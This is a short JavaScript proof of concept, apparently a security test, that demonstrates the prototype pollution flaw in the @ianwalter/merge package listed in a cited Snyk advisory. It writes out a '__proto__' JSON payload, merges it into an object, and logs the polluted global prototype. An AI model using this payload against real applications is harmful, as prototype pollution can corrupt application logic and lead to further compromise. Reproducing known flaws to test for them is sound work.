// //https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
// test("prototype pollution in @ianwalter/merge", () => {
  const merge = require("@ianwalter/merge");

console.log({}.polluted);

  let EVIL_JSON = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  merge({}, EVIL_JSON);
console.log({}.polluted);
// });
